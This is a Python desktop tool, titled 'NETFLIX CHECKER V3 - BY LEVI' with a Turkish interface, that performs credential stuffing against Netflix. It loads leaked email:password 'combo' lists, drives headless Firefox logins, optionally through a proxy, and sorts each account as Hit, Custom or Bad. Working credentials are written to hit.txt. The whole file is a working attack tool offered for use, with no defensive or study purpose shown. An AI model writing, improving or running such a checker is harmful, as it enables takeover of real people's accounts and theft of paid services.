import sys
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLabel, QFileDialog, QTableWidget,
    QTableWidgetItem, QGridLayout, QMessageBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

class AccountCheckerThread(QThread):
    update_table = pyqtSignal(str, str)

    def __init__(self, combo_file, proxy_file=None):
        super().__init__()
        self.combo_file = combo_file
        self.proxy_file = proxy_file
        self.running = True

    def init_driver(self):
        options = webdriver.FirefoxOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--headless")

        if self.proxy_file:
            with open(self.proxy_file, 'r') as f:
                proxy = f.readline().strip()
            firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX
            firefox_capabilities['proxy'] = {
                "proxyType": "MANUAL",
                "httpProxy": proxy,
                "ftpProxy": proxy,
                "sslProxy": proxy
            }
            driver = webdriver.Firefox(options=options, desired_capabilities=firefox_capabilities)
        else:
            driver = webdriver.Firefox(options=options)

        return driver

    def run(self):
        driver = self.init_driver()
        driver.get("https://netflix.com/login")

        with open(self.combo_file, "r", encoding="utf-8") as f:
            accounts = f.readlines()

        with open("hit.txt", "a") as hit_file:
            for account in accounts:
                if not self.running:
                    break

                email, password = account.strip().split(":")
                result = self.try_login(driver, email, password)

                if result == "Hit":
                    self.update_table.emit(email, password + " | Hit")
                    hit_file.write(f"{email}:{password}\n") 
                    hit_file.flush() 
                elif result == "Custom":
                    self.update_table.emit(email, password + " | Custom")
                else:
                    self.update_table.emit(email, password + " | Bad")

        driver.quit()

    def try_login(self, driver, email, password):
        try:
            email_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "userLoginId"))
            )
            password_input = driver.find_element(By.NAME, "password")

            email_input.clear()
            email_input.send_keys(email)
            password_input.clear()
            password_input.send_keys(password)
            password_input.send_keys(Keys.RETURN)

            time.sleep(5)

            if "login" in driver.current_url:
                return "Bad"

            try:
                driver.find_element(By.CLASS_NAME, "account-cancel-streaming-message")
                return "Custom"
            except:
                return "Hit"
        except Exception as e:
            print(f"Hata: {e}")
            return "Bad"

    def stop(self):
        self.running = False

class NetflixChecker(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NETFLIX CHECKER V3 - BY LEVI")
        self.setGeometry(100, 100, 800, 500)
        self.setup_ui()
        self.combo_file = None
        self.proxy_file = None

    def setup_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()

        header_label = QLabel("NETFLIX CHECKER V3 - BY LEVI")
        header_label.setAlignment(Qt.AlignCenter)
        header_label.setStyleSheet("font-weight: bold; font-size: 16px;")

        proxy_label = QLabel("Proxyless Tarayabilirsiniz.")
        proxy_label.setAlignment(Qt.AlignCenter)
        proxy_label.setStyleSheet("font-size: 12px;")

        button_layout = QHBoxLayout()
        self.combo_button = QPushButton("Combo Seç")
        self.combo_button.clicked.connect(self.select_combo)
        self.proxy_button = QPushButton("Proxy Seç")
        self.proxy_button.clicked.connect(self.select_proxy)
        self.start_button = QPushButton("Başlat")
        self.start_button.setEnabled(False)
        self.stop_button = QPushButton("Durdur")
        self.stop_button.setEnabled(False)

        for btn in (self.combo_button, self.proxy_button, self.start_button, self.stop_button):
            btn.setStyleSheet("border: 2px solid green; border-radius: 10px; padding: 5px;")

        button_layout.addWidget(self.combo_button)
        button_layout.addWidget(self.proxy_button)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)

        counter_layout = QGridLayout()
        self.hit_label = QLabel("Hit: 0")
        self.bad_label = QLabel("Bad: 0")
        self.custom_label = QLabel("Custom: 0")

        counter_layout.addWidget(self.hit_label, 0, 0)
        counter_layout.addWidget(self.bad_label, 1, 0)
        counter_layout.addWidget(self.custom_label, 2, 0)

        self.left_output = QTextEdit()
        self.left_output.setReadOnly(True)

        self.table = QTableWidget()
        self.table.setColumnCount(2)
        self.table.setHorizontalHeaderLabels(["Email:Password", "Status"])
        self.table.setRowCount(0)

        self.table.setColumnWidth(0, 500)
        self.table.setColumnWidth(1, 280)

        main_layout.addWidget(header_label)
        main_layout.addWidget(proxy_label)
        main_layout.addLayout(button_layout)
        main_layout.addWidget(self.left_output)
        main_layout.addLayout(counter_layout)
        main_layout.addWidget(self.table)

        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)

    def select_combo(self):
        combo_file, _ = QFileDialog.getOpenFileName(self, "Combo Dosyasını Seç", "", "Text Files (*.txt)")
        if combo_file:
            self.combo_file = combo_file
            self.left_output.append(f"Combo seçildi: {combo_file}")
            self.check_start_condition()

    def select_proxy(self):
        QMessageBox.warning(self, "Uyarı", "YAKINDA...", QMessageBox.Ok)

    def check_start_condition(self):
        if self.combo_file:
            self.start_button.setEnabled(True)
            self.start_button.clicked.connect(self.start_checking)

    def start_checking(self):
        self.left_output.append("Taranıyor...")
        self.thread = AccountCheckerThread(self.combo_file, self.proxy_file)
        self.thread.update_table.connect(self.add_to_table)
        self.thread.start()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.stop_button.clicked.connect(self.stop_checking)

    def stop_checking(self):
        self.thread.stop()
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def add_to_table(self, email, status):
        row_position = self.table.rowCount()
        email_password, status = status.split(" | ")
        self.table.insertRow(row_position)
        self.table.setItem(row_position, 0, QTableWidgetItem(f"{email}:{email_password}"))
        self.table.setItem(row_position, 1, QTableWidgetItem(status))

        if status == "Hit":
            current_hit = int(self.hit_label.text().split(": ")[1]) + 1
            self.hit_label.setText(f"Hit: {current_hit}")
        elif status == "Custom":
            current_custom = int(self.custom_label.text().split(": ")[1]) + 1
            self.custom_label.setText(f"Custom: {current_custom}")
        else:
            current_bad = int(self.bad_label.text().split(": ")[1]) + 1
            self.bad_label.setText(f"Bad: {current_bad}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = NetflixChecker()
    window.show()
    sys.exit(app.exec_())
